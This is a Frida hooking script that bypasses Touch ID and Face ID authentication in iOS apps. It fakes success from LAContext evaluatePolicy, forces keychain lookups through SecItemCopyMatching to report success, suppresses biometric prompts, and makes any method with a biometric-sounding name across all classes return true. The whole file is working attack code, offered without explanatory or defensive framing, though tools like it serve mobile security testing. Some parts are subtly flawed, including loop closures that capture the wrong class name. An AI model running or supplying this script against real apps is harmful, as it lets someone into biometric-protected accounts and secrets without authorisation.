/*
 * iOS Touch ID/Face ID Bypass
 * Bypasses biometric authentication on iOS
 */

console.log("[*] iOS Biometric Authentication Bypass loaded");

if (ObjC.available) {
    // LAContext evaluatePolicy bypass
    var LAContext = ObjC.classes.LAContext;
    if (LAContext) {
        var evaluatePolicy = LAContext['- evaluatePolicy:localizedReason:reply:'];
        if (evaluatePolicy) {
            Interceptor.attach(evaluatePolicy.implementation, {
                onEnter: function(args) {
                    console.log("[*] LAContext evaluatePolicy called");
                    
                    // Get the policy type
                    var policy = args[2].toInt32();
                    var reason = new ObjC.Object(args[3]).toString();
                    
                    console.log("[*] Policy: " + policy + ", Reason: " + reason);
                    
                    // Call the completion block with success
                    var completionBlock = new ObjC.Block(args[4]);
                    var error = NULL;
                    
                    // Schedule the success callback
                    setTimeout(function() {
                        console.log("[*] Biometric authentication bypassed - returning success");
                        completionBlock(true, error);
                    }, 100);
                    
                    // Prevent original method execution
                    this.prevented = true;
                },
                onLeave: function(retval) {
                    if (this.prevented) {
                        // Method was prevented, don't execute original
                        this.prevented = false;
                    }
                }
            });
            console.log("[+] LAContext evaluatePolicy hooked");
        }
    }

    // LABiometryType bypass (for newer iOS versions)
    try {
        var LABiometryType = ObjC.classes.LABiometryType;
        if (LABiometryType) {
            console.log("[+] LABiometryType found - biometry available");
        }
    } catch (e) {
        console.log("[-] LABiometryType not available");
    }

    // SecItemCopyMatching bypass for keychain biometric items
    var SecItemCopyMatching = Module.findExportByName("Security", "SecItemCopyMatching");
    if (SecItemCopyMatching) {
        Interceptor.attach(SecItemCopyMatching, {
            onEnter: function(args) {
                var query = new ObjC.Object(args[0]);
                console.log("[*] SecItemCopyMatching called");
                
                // Check if this is a biometric-protected item
                try {
                    var accessControl = query.objectForKey_("kSecAccessControl");
                    if (accessControl) {
                        console.log("[*] Biometric-protected keychain item accessed");
                    }
                } catch (e) {
                    // Ignore errors
                }
            },
            onLeave: function(retval) {
                if (retval.toInt32() !== 0) { // errSecSuccess = 0
                    console.log("[*] SecItemCopyMatching failed, forcing success");
                    retval.replace(0); // Return success
                }
            }
        });
        console.log("[+] SecItemCopyMatching hooked");
    }

    // Touch ID/Face ID prompt bypass in UIKit
    var UIAlertController = ObjC.classes.UIAlertController;
    if (UIAlertController) {
        var presentViewController = UIAlertController['- presentViewController:animated:completion:'];
        if (presentViewController) {
            Interceptor.attach(presentViewController.implementation, {
                onEnter: function(args) {
                    var viewController = new ObjC.Object(args[2]);
                    
                    try {
                        var title = viewController.title();
                        if (title && (title.toString().toLowerCase().includes("touch") || 
                                    title.toString().toLowerCase().includes("face"))) {
                            console.log("[*] Biometric prompt bypassed: " + title);
                            
                            // Don't present the biometric prompt
                            args[2] = ObjC.classes.UIViewController.alloc().init();
                        }
                    } catch (e) {
                        // Ignore errors
                    }
                }
            });
            console.log("[+] UIAlertController presentation hooked");
        }
    }

    // Custom biometric authentication method bypass
    // This targets common implementation patterns
    var methods_to_hook = [
        "authenticateWithBiometrics",
        "verifyBiometric",
        "checkBiometricAuth",
        "validateBiometrics",
        "biometricAuthentication"
    ];

    methods_to_hook.forEach(function(methodName) {
        try {
            // Search for methods in all classes
            for (var className in ObjC.classes) {
                var clazz = ObjC.classes[className];
                var method = clazz['- ' + methodName];
                
                if (method) {
                    Interceptor.attach(method.implementation, {
                        onEnter: function(args) {
                            console.log("[*] Custom biometric method bypassed: " + methodName + " in " + className);
                        },
                        onLeave: function(retval) {
                            // Force return true/success
                            retval.replace(1);
                        }
                    });
                    console.log("[+] Hooked " + methodName + " in " + className);
                }
            }
        } catch (e) {
            // Method not found, continue
        }
    });

    // Common biometric library bypasses
    
    // BiometricAuthenticationService (common third-party)
    try {
        var BiometricAuthenticationService = ObjC.classes.BiometricAuthenticationService;
        if (BiometricAuthenticationService) {
            var authenticate = BiometricAuthenticationService['- authenticate'];
            if (authenticate) {
                Interceptor.attach(authenticate.implementation, {
                    onEnter: function(args) {
                        console.log("[*] BiometricAuthenticationService bypassed");
                    },
                    onLeave: function(retval) {
                        retval.replace(1); // Return success
                    }
                });
                console.log("[+] BiometricAuthenticationService hooked");
            }
        }
    } catch (e) {
        console.log("[-] BiometricAuthenticationService not found");
    }

    // KeychainWrapper biometric bypass
    try {
        var KeychainWrapper = ObjC.classes.KeychainWrapper;
        if (KeychainWrapper) {
            var retrieveDataFromKeychain = KeychainWrapper['- retrieveDataFromKeychain:'];
            if (retrieveDataFromKeychain) {
                Interceptor.attach(retrieveDataFromKeychain.implementation, {
                    onEnter: function(args) {
                        console.log("[*] KeychainWrapper biometric check bypassed");
                    },
                    onLeave: function(retval) {
                        // Return mock data if needed
                        if (retval.isNull()) {
                            var mockData = ObjC.classes.NSData.alloc().init();
                            retval.replace(mockData);
                        }
                    }
                });
                console.log("[+] KeychainWrapper hooked");
            }
        }
    } catch (e) {
        console.log("[-] KeychainWrapper not found");
    }

    // Generic success return for common method patterns
    var success_patterns = [
        "isAuthenticated",
        "isBiometricEnabled",
        "canUseBiometric",
        "biometricAvailable"
    ];

    success_patterns.forEach(function(pattern) {
        try {
            for (var className in ObjC.classes) {
                var clazz = ObjC.classes[className];
                
                // Try both instance and class methods
                var instanceMethod = clazz['- ' + pattern];
                var classMethod = clazz['+ ' + pattern];
                
                if (instanceMethod) {
                    Interceptor.attach(instanceMethod.implementation, {
                        onLeave: function(retval) {
                            console.log("[*] " + pattern + " forced to return true");
                            retval.replace(1);
                        }
                    });
                }
                
                if (classMethod) {
                    Interceptor.attach(classMethod.implementation, {
                        onLeave: function(retval) {
                            console.log("[*] " + pattern + " (class method) forced to return true");
                            retval.replace(1);
                        }
                    });
                }
            }
        } catch (e) {
            // Continue with next pattern
        }
    });

    console.log("[*] iOS Biometric Authentication Bypass setup complete!");
} else {
    console.log("[-] Objective-C runtime not available");
}